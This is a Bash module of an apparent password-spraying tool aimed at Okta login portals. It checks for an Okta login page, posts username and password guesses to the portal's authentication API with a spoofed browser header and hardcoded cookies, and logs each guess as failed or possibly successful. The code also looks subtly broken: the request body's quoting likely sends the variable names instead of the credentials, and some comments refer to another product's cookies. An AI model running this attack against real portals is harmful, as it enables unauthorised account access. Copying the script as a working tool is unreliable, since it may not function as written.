#!/bin/bash

check_Okta(){
	check_Portal=$(wget --timeout=4 -qO- https://$1/login/login.htm --no-check-certificate);
	if ([ "$(echo $check_Portal | grep 'okta-container' )" ]) || [[ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "disable_check" ]]; then
			echo "";
			echo "***This Module for Okta is incomplete and might show false positives, recommended to run with DEBUG***";
	else
		echo "Either not an Okta portal, or not compatible version.";
		echo "Exiting...";
		exit 1;
	fi
}

POST_Okta(){

LOG_YES=false;
LOG=/tmp/conformer.log;
#Determine if Logging, and where to log
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "log="* ]]; then
LOG_YES=true;
LOG=$(echo "$5" | grep -i log | cut -d "=" -f 2);
	if [[ "$LOG" == "" ]] ; then
		LOG=$(echo "$6" | grep -i log | cut -d "=" -f 2);
		if [[ "$LOG" == "" ]] ; then
			LOG=$(echo "$7" | grep -i log | cut -d "=" -f 2);
			if [[ "$LOG" == "" ]] ; then
				LOG=$(echo "$8" | grep -i log | cut -d "=" -f 2);
			fi
		fi
	fi
fi
if [[ -d "$LOG" ]] ; then
	LOG_YES=false;
fi


DEBUG_YES=false;
DEBUG=/tmp/conformer.debug;
#Determine if Debuging, and where to debug to.
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "debug="* ]]; then
DEBUG_YES=true;
DEBUG=$(echo "$5" | grep -i debug | cut -d "=" -f 2);
	if [[ "$DEBUG" == "" ]] ; then
		DEBUG=$(echo "$6" | grep -i debug | cut -d "=" -f 2);
		if [[ "$DEBUG" == "" ]] ; then
			DEBUG=$(echo "$7" | grep -i debug | cut -d "=" -f 2);
			if [[ "$DEBUG" == "" ]] ; then
				DEBUG=$(echo "$8" | grep -i debug | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$DEBUG" ]] ; then
	DEBUG_YES=false;
fi
fi


			POST=$(curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Content-Type: application/json' -H $'X-Okta-User-Agent-Extended: okta-signin-widget-2.8.0' -H $'X-Okta-XsrfToken: ' -H $'X-Requested-With: XMLHttpRequest' -H $'Referer: https://'$1'/login/login.htm' \
    -b $'DT=DI01f0xbXJZRmWZZmxVbDo5qA; JSESSIONID=3E99404AE09462D8DF79D01AAB5526DC; t=slate' \
    --data-binary $'{\"username\":\"$line\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true},\"password\":\"$pass\"}' \
    $'https://'$1'/api/v1/authn');
		#If Logging is enabled loop userlist
		if [[ $DEBUG_YES == true ]]; then
			echo "host:$1 username:$line password:$pass" >> "$DEBUG";
			echo "" >> "$DEBUG";			
			echo "$POST" >> "$DEBUG";
			echo "" >> "$DEBUG";	
			echo "" >> "$DEBUG";	
			echo "-------------------------------------------------------------" >> "$DEBUG";	
		fi
			#checks cookie to see if successful login
			if [[ $POST == *"Authentication failed"* ]]; then
				echo "	$line:$pass:Fail";
			if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:Fail" >> "$LOG";
			fi
			#Add When can validate successful login			
			#elif [[ $POST == *"Set-Cookie: NSC_AAAC="* ]]; then
			#	echo "	$line:$pass:**Success**";
			#if [[ $LOG_YES == true ]]; then
			#	echo "	$line:$pass:**Success**" >> "$LOG";
			#fi
			else #Set-Cookie: NSC_VPNERR=4001 (failed cookie) (if need to be explict later)
				echo "	$line:$pass:Success/Fail (Needs to be validated)";
			if [[ $LOG_YES == true ]]; then
				echo "	$line:$pass:Success/Fail (Needs to be validated)" >> "$LOG";
			fi
			fi
}
